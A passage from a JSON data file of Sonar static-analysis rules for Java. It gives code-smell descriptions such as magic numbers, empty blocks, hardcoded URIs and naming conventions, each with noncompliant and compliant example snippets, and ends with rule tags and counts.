doSomething() {\n  for (int i = 0; i &lt; 4; i++) {  // Noncompliant, 4 is a magic number\n    ...\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic static final int NUMBER_OF_CYCLES = 4;\npublic static void doSomething() {\n  for (int i = 0; i &lt; NUMBER_OF_CYCLES ; i++) { // Compliant\n    ...\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-109","summary":"Magic numbers should not be used","tags":["brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>An empty code block is confusing. It will require some effort from maintainers to determine if it is intentional or indicates the implementation is\nincomplete.</p>\n<pre>\nfor (int i = 0; i &lt; 42; i++){}  // Noncompliant: is the block empty on purpose, or is code missing?\n</pre>\n<p>Removing or filling the empty code blocks takes away ambiguity and generally results in a more straightforward and less surprising code.</p>\n<h3>Exceptions</h3>\n<p>The rule ignores code blocks that contain comments unless they are <code>synchronized</code> blocks because these can affect program flow.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-108","summary":"Nested blocks of code should not be left empty","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Hard-coding a URI makes it difficult to test a program for a variety of reasons:</p>\n<ul>\n  <li> path literals are not always portable across operating systems </li>\n  <li> a given absolute path may not exist in a specific test environment </li>\n  <li> a specified Internet URL may not be available when executing the tests </li>\n  <li> production environment filesystems usually differ from the development environment </li>\n</ul>\n<p>In addition, hard-coded URIs can contain sensitive information, like IP addresses, and they should not be stored in the code.</p>\n<p>For all those reasons, a URI should never be hard coded. Instead, it should be replaced by a customizable parameter.</p>\n<p>Further, even if the elements of a URI are obtained dynamically, portability can still be limited if the path delimiters are hard-coded.</p>\n<p>This rule raises an issue when URIs or path delimiters are hard-coded.</p>\n<h3>Exceptions</h3>\n<p>This rule does not raise an issue when:</p>\n<ul>\n  <li> A constant path is relative and contains at most two parts. </li>\n  <li> A constant path is used in an annotation </li>\n  <li> A path is annotated </li>\n</ul>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Foo {\n  public static final String FRIENDS_ENDPOINT = \"/user/friends\"; // Compliant path is relative and has only two parts\n\n  public Collection&lt;User&gt; listUsers() {\n    File userList = new File(\"/home/mylogin/Dev/users.txt\"); // Noncompliant\n    Collection&lt;User&gt; users = parse(userList);\n    return users;\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Foo {\n  // Configuration is a class that returns customizable properties: it can be mocked to be injected during tests.\n  private Configuration config;\n  public Foo(Configuration myConfig) {\n    this.config = myConfig;\n  }\n  public Collection&lt;User&gt; listUsers() {\n    // Find here the way to get the correct folder, in this case using the Configuration object\n    String listingFolder = config.getProperty(\"myApplication.listingFolder\");\n    // and use this parameter instead of the hard coded path\n    File userList = new File(listingFolder, \"users.txt\"); // Compliant\n    Collection&lt;User&gt; users = parse(userList);\n    return users;\n  }\n}\n</pre>\n<p>Exceptions examples:</p>\n<pre>\npublic class Foo {\n  public static final String FRIENDS_ENDPOINT = \"/user/friends\"; // Compliant path is relative and has only two parts\n\n  public static final String ACCOUNT = \"/account/group/list.html\"; // Compliant path is used in an annotation\n\n  @Value(\"${base.url}\" + ACCOUNT)\n  private String groupUrl;\n\n  @MyAnnotation()\n  String path = \"/default/url/for/site\"; // Compliant path is annotated\n\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1075","summary":"URIs should not be hardcoded","tags":["android","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Methods with a long parameter list are difficult to use because maintainers must figure out the role of each parameter and keep track of their\nposition.</p>\n<pre>\nvoid setCoordinates(int x1, int y1, int z1, int x2, int y2, int z2) { // Noncompliant\n    // ...\n}\n</pre>\n<p>The solution can be to:</p>\n<ul>\n  <li> Split the method into smaller ones </li>\n</ul>\n<pre>\n// Each function does a part of what the original setCoordinates function was doing, so confusion risks are lower\nvoid setOrigin(int x, int y, int z) {\n   // ...\n}\n\nvoid setSize(int width, int height, int depth) {\n   // ...\n}\n</pre>\n<ul>\n  <li> Find a better data structure for the parameters that group data in a way that makes sense for the specific application domain </li>\n</ul>\n<pre>\nclass Point // In geometry, Point is a logical structure to group data\n{\n    public int x;\n    public int y;\n    public int z;\n };\n\nvoid setCoordinates(Point p1, Point p2) {\n    // ...\n}\n</pre>\n<p>This rule raises an issue when a method has more parameters than the provided threshold.</p>\n<h3>Exceptions</h3>\n<p>Methods annotated with :</p>\n<ul>\n  <li> Springâs <code>@RequestMapping</code> (and related shortcut annotations, like <code>@GetRequest</code>) </li>\n  <li> JAX-RS API annotations (like <code>@javax.ws.rs.GET</code>) </li>\n  <li> Bean constructor injection with <code>@org.springframework.beans.factory.annotation.Autowired</code> </li>\n  <li> CDI constructor injection with <code>@javax.inject.Inject</code> </li>\n  <li> <code>@com.fasterxml.jackson.annotation.JsonCreator</code> </li>\n  <li> Micronautâs annotations (like <code>@io.micronaut.http.annotation.Get</code>) </li>\n</ul>\n<p>may have a lot of parameters, encapsulation being possible. Therefore the rule ignores such methods.</p>\n<p>Also, if a class annotated as a Spring component (like <code>@org.springframework.stereotype.Component</code>) has a single constructor, that\nconstructor will be considered <code>@Autowired</code> and ignored by the rule.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-107","summary":"Methods should not have too many parameters","tags":["brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>If a <code>private</code> field is declared but not used locally, its limited visibility makes it dead code.</p>\n<p>This is either a sign that some logic is missing or that the code should be cleaned.</p>\n<p>Cleaning out dead code decreases the size of the maintained codebase, making it easier to understand and preventing bugs from being introduced.</p>\n<pre>\npublic class MyClass {\n  private int foo = 42; // Noncompliant: foo is unused and should be removed\n\n  public int compute(int a) {\n    return a * 42;\n  }\n\n}\n</pre>\n<p>Note that this rule does not take reflection into account, which means that issues will be raised on <code>private</code> fields that are only\naccessed using the reflection API.</p>\n<h3>Exceptions</h3>\n<p>The rule admits 3 exceptions:</p>\n<ul>\n  <li> Serialization ID fields </li>\n</ul>\n<p>The Java serialization runtime associates with each serializable class a version number called <code>serialVersionUID</code>, which is used during\ndeserialization to verify that the sender and receiver of a serialized object have loaded classes for that object that are compatible for\nserialization.</p>\n<p>A serializable class can declare its own <code>serialVersionUID</code> explicitly by declaring a field named <code>serialVersionUID</code> that\nmust be static, final, and of type long. By definition, those <code>serialVersionUID</code> fields should not be reported by this rule:</p>\n<pre>\npublic class MyClass implements java.io.Serializable {\n  private static final long serialVersionUID = 42L;  // Compliant by exception\n}\n</pre>\n<ul>\n  <li> Annotated fields and classes annotated with Lombok annotations </li>\n</ul>\n<p>The unused field in this class will not be reported by the rule as it is annotated, except if annotation class <code>SomeAnnotation</code> is\nlisted in the <code>ignoreAnnotations</code> parameter (see Parameters).</p>\n<pre>\npublic class MyClass {\n  @SomeAnnotation\n  private int unused;  // Compliant by exception\n}\n</pre>\n<ul>\n  <li> Fields from classes with native methods </li>\n</ul>\n<p>The unused field in this class will not be reported by the rule as it might be used by native code.</p>\n<pre>\npublic class MyClass {\n  private int unused = 42;  // Compliant by exception\n  private native static void doSomethingNative();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1068","summary":"Unused \"private\" fields should be removed","tags":["unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>\noperators it contains.</p>\n<p>A single expressionâs complexity should not become too high to keep the code readable.</p>\n<h3>Noncompliant code example</h3>\n<p>With the default threshold value of 3:</p>\n<pre>\nif (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... }\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nif ( (myFirstCondition() || mySecondCondition()) &amp;&amp; myLastCondition()) { ... }\n</pre>\n<h3>Exceptions</h3>\n<p>No issue is reported inside <code>equals</code> methods, because it is common to compare all the fields of a class for equality inside this kind of\nmethod.</p>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1067","summary":"Expressions should not be too complex","tags":["brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Nested code - blocks of code inside blocks of code - is eventually necessary, but increases complexity. This is why keeping the code as flat as\npossible, by avoiding unnecessary nesting, is considered a good practice.</p>\n<p>Merging <code>if</code> statements when possible will decrease the nesting of the code and improve its readability.</p>\n<p>Code like</p>\n<pre>\nif (condition1) {\n  if (condition2) {             // Noncompliant\n    /* ... */\n  }\n}\n</pre>\n<p>Will be more readable as</p>\n<pre>\nif (condition1 &amp;&amp; condition2) { // Compliant\n  /* ... */\n}\n</pre>\n<h2>How to fix it</h2>\n<p>If merging the conditions seems to result in a more complex code, extracting the condition or part of it in a named function or variable is a\nbetter approach to fix readability.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre>\nif (file != null) {\n  if (file.isFile() || file.isDirectory()) {  // Noncompliant\n    /* ... */\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre>\nif (file != null &amp;&amp; isFileOrDirectory(file)) { // Compliant\n  /* ... */\n}\n\nprivate static boolean isFileOrDirectory(File file) {\n  return file.isFile() || file.isDirectory();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1066","summary":"Mergeable \"if\" statements should be combined","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>If a label is declared but not used in the program, it can be considered as dead code and should therefore be removed.</p>\n<p>This will improve maintainability as developers will not wonder what this label is used for.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nvoid foo() {\n  outer: //label is not used.\n  for(int i = 0; i&lt;10; i++) {\n    break;\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nvoid foo() {\n  for(int i = 0; i&lt;10; i++) {\n    break;\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1065","summary":"Unused labels should be removed","tags":["cert","unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In software development, logs serve as a record of events within an application, providing crucial insights for debugging. When logging, it is\nessential to ensure that the logs are:</p>\n<ul>\n  <li> easily accessible </li>\n  <li> uniformly formatted for readability </li>\n  <li> properly recorded </li>\n  <li> securely logged when dealing with sensitive data </li>\n</ul>\n<p>Those requirements are not met if a program directly writes to the standard outputs (e.g., System.out, System.err). That is why defining and using\na dedicated logger is highly recommended.</p>\n<h3>Code examples</h3>\n<p>The following noncompliant code:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass MyClass {\n  public void doSomething() {\n    System.out.println(\"My Message\");  // Noncompliant, output directly to System.out without a logger\n  }\n}\n</pre>\n<p>Could be replaced by:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.util.logging.Logger;\n\nclass MyClass {\n\n  Logger logger = Logger.getLogger(getClass().getName());\n\n  public void doSomething() {\n    // ...\n    logger.info(\"My Message\");  // Compliant, output via logger\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/7/docs/api/java/util/logging/Logger.html\">Java SE 7 API Specification: java.util.logging.Logger</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/nzdGBQ\">CERT, ERR02-J.</a> - Prevent exceptions while logging data </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-106","summary":"Standard outputs should not be used directly to log anything","tags":["bad-practice","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"MODULAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The tab width can differ from one development environment to another. Using tabs may require other developers to configure their environment (text\neditor, preferences, etc.) to read source code.</p>\n<p>That is why using spaces is preferable.</p>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-105","summary":"Tabulation characters should not be used","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When a source file grows too much, it can accumulate numerous responsibilities and become challenging to understand and maintain.</p>\n<p>Above a specific threshold, refactor the file into smaller files whose code focuses on well-defined tasks. Those smaller files will be easier to\nunderstand and test.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-104","summary":"Files should not have too many lines of code","tags":["architecture","brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Scrolling horizontally to see a full line of code lowers the code readability.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-103","summary":"Lines should not be too long","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Shared naming conventions allow teams to collaborate efficiently.</p>\n<p>This rule raises an issue when a class name does not match a provided regular expression.</p>\n<p>For example, with the default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>, the class:</p>\n<pre>\nclass my_class {...} // Noncompliant\n</pre>\n<p>should be renamed to</p>\n<pre>\nclass MyClass {...}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-101","summary":"Class names should comply with a naming convention","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Shared naming conventions allow teams to collaborate efficiently.</p>\n<p>This rule raises an issue when a method name does not match a provided regular expression.</p>\n<p>For example, with the default provided regular expression <code>^[a-z][a-zA-Z0-9]*$</code>, the method:</p>\n<pre>\npublic int DoSomething(){...} // Noncompliant\n</pre>\n<p>should be renamed to</p>\n<pre>\npublic int doSomething(){...}\n</pre>\n<h3>Exceptions</h3>\n<p>Overriding methods are excluded.</p>\n<pre>\n@Override\npublic int Do_Something(){...} // Compliant by exception\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-100","summary":"Method names should comply with a naming convention","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"}],"tags":[{"name":"android"},{"name":"api-design"},{"name":"architecture"},{"name":"assertj"},{"name":"aws"},{"name":"bad-practice"},{"name":"best-practice"},{"name":"brain-overload"},{"name":"bug"},{"name":"cert"},{"name":"clumsy"},{"name":"confusing"},{"name":"convention"},{"name":"cwe"},{"name":"deadlock"},{"name":"debug"},{"name":"denial-of-service"},{"name":"design"},{"name":"duplicate"},{"name":"error-handling"},{"name":"finding"},{"name":"hibernate"},{"name":"i18n"},{"name":"injection"},{"name":"java"},{"name":"java10"},{"name":"java14"},{"name":"java15"},{"name":"java16"},{"name":"java17"},{"name":"java21"},{"name":"java22"},{"name":"java23"},{"name":"java24"},{"name":"java7"},{"name":"java8"},{"name":"java9"},{"name":"javadoc"},{"name":"jee"},{"name":"jpa"},{"name":"jspecify"},{"name":"junit"},{"name":"leak"},{"name":"lock-in"},{"name":"logging"},{"name":"mockito"},{"name":"multi-threading"},{"name":"nullability"},{"name":"obsolete"},{"name":"overflow"},{"name":"performance"},{"name":"pitfall"},{"name":"privacy"},{"name":"python3"},{"name":"redundant"},{"name":"regex"},{"name":"rules"},{"name":"sans-top25"},{"name":"serialization"},{"name":"singleton"},{"name":"spring"},{"name":"sql"},{"name":"ssl"},{"name":"startup-time"},{"name":"struts"},{"name":"suspicious"},{"name":"sustainability"},{"name":"symbolic-execution"},{"name":"tests"},{"name":"unpredictable"},{"name":"unused"},{"name":"user-experience"}],"impacts":[{"name":"maintainability"},{"name":"reliability"},{"name":"security"}],"cleanCodeAttributes":["intentionality","consistency","responsibility","adaptability"],"types":{"Bug":175,"Code_Smell":458,"Security_Hotspot":40,"Vulnerability":60}}}]}},"pageContext":{"language":{"name":"Java","key":"java"},"languageKey":"java","ruleKey":"RSPEC-2127"}},"staticQueryHashes":["3932435093"],"slicesMap":{}}
